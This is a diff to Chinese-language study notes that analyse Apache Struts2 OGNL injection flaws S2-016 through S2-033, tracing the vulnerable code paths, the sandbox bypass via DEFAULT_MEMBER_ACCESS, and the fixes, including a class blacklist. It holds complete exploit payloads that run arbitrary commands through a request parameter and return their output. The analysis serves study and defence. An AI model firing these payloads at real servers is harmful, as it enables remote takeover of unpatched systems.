@@ -440,8 +440,96 @@ ${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.g
 ```
 
 ### S2-016
-问题出在DefaultActionMapper，可以在方法前加上`action:`、`redirect:`或`redirectAction:`，将导航信息附加到表单中。
+问题出在DefaultActionMapper，它会寻找请求匹配的路径。
 ```
 redirect:%{#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')}
 ```
+`DefaultActionMapper.handleSpecialParameters()`会对特殊前缀进行处理，包括`method:`、`action:`、`redirect:`或`redirectAction:`，将导航信息附加到表单中。后续也会调用到`TextParseUtil.translateVariables()`，对前缀后的内容将逆行OGNL计算。
 
+S2-017和这个漏洞是一个了，只不过是重定向漏洞，在`redirect:`后面加上url链接。
+
+修复时，`action:`、`redirect:`或`redirectAction:`，action增加了正则匹配。后两个在 DefaultActionMapper中直接被删除了。
+
+### S2-029
+S2-001用到了`<s:textfield name="password"/>`，然后对传入值进行二次解析造成了漏洞。S2-029同样是由于`textfield`标签。但是需要在name字段写成如下形式
+```
+<s:textfield name="%{message}"></s:textfield>
+```
+这样`UIBean.evaluateParams()`在对标签进行解析时，对name依次进行`findString()、findValue()、TextParseUtil.translateVariables()`。由于name本身是被`%{}`包裹的。会将name对应的传入值取出。然后在后续的步骤中对值进行解析。这样就避免了单次执行递归解析的限制。分成两次进行解析。
+```
+if (this.name != null) {
+    name = this.findString(this.name);  // (1) %{message}取出message对应的值
+    this.addParameter("name", name);
+}
+...
+ if (this.parameters.containsKey("value")) {...}
+ else if (this.evaluateNameValue()) {
+    Class valueClazz = this.getValueClassType();
+    if (valueClazz != null) {
+	if (this.value != null) {
+	    this.addParameter("nameValue", this.findValue(this.value, valueClazz)); // (2) 对message的值进行OGNL解析
+	} 
+    }
+}
+```
+在S2-029修复时在struts.excludedClasses属性中增加了很多限制，如下的类都被列入到黑名单中（参照`struts-default.xml`），禁止调用命令执行常用类，并禁止调用SecurityMemberAccess。
+```
+java.lang.Object,
+java.lang.Runtime,
+java.lang.System,
+java.lang.Class,
+java.lang.ClassLoader,
+java.lang.Shutdown,
+java.lang.ProcessBuilder,
+ognl.OgnlContext,
+ognl.ClassResolver,
+ognl.TypeConverter,
+com.opensymphony.xwork2.ognl.SecurityMemberAccess, 
+com.opensymphony.xwork2.ActionContex
+```
+
+### S2-032
+`DefaultActionMapper`对特殊前缀进行处理，包括`method:`、`action:`、`redirect:`或`redirectAction:`。S2-016中对后三个进行了利用。在跳转时会对参数进行OGNL解析。而S2-032则是利用`method:`。`method:`后的内容会被截取，执行到`DefaultActionInvocation.invokeAction()`
+```
+protected String invokeAction(Object action, ActionConfig actionConfig) throws Exception {
+    methodResult = this.ognlUtil.getValue(methodName + "()", this.getStack().getContext(), action); // methodName是`method:`后的内容，和()拼接
+}
+```
+这个漏洞的payload很有意思，首先`method:`最后结尾有个.toString，它和`()`拼接成`toString`方法调用。实际上就是为了闭合代码中的`()`。另外沙箱的绕过方法很巧妙
+```
+method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=open -a Calculator.app
+```
+
+沙箱绕过: `#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`  
+S2-029高版本也是用了这个方式。在之前的payload中都是`#_memberAccess["allowStaticMethodAccess"]=true`。主要源于`SecurityMemberAccess.isAccessible()`判断发生了变化
+```
+public class SecurityMemberAccess extends DefaultMemberAccess {
+    private final boolean allowStaticMethodAccess; // 默认为false
+
+    public boolean isAccessible(Map context, Object target, Member member, String propertyName) {
+        Class targetClass = target.getClass();
+        Class memberClass = member.getDeclaringClass();
+        if (Modifier.isStatic(member.getModifiers()) && this.allowStaticMethodAccess) { //  a. 
+            if (!this.isClassExcluded(member.getDeclaringClass())) { // 是否在excludedClasses的黑名单中
+	        targetClass = member.getDeclaringClass();
+	    }
+        }
+        if (this.isPackageExcluded(targetClass.getPackage(), memberClass.getPackage())) { return false;}
+        else if (this.isClassExcluded(targetClass)) { return false; } // b. 常见利用类在这一步都无法通过校验
+    }
+}
+```
+可以看到a.处就防御了之前`#_memberAccess["allowStaticMethodAccess"]=true`的payload,因为即使更改了allowStaticMethodAccess属性，依旧无法通过调用类的黑名单  
+b.处防御了`#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')`这种反射的写法，因为反射本身调用的是`java.lang.Class`也在黑名单中。
+而payload很巧妙的用了`SecurityMemberAccess`的父类`DefaultMemberAccess`，父类的`isAccessible()`方法中并没有对静态方法和调用类进行限制。也就是让执行流程从`SecurityMemberAccess.isAccessible()`改为执行`DefaultMemberAccess.isAccessible()`直接规避了防御和黑名单，非常巧妙。在利用时，依靠OgnlContext的一行代码
+```
+public static final MemberAccess DEFAULT_MEMBER_ACCESS = new DefaultMemberAccess(false);
+```
+通过`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`赋值，将`SecurityMemberAccess`替换为`DefaultMemberAccess`
+
+S2-032在修复时直接在`method:`后内容截取时加入了正则`[a-zA-Z0-9._!/\\-]*`
+
+### S2-033
+```
+%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec(%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&command=open -a Calculator.app
+```
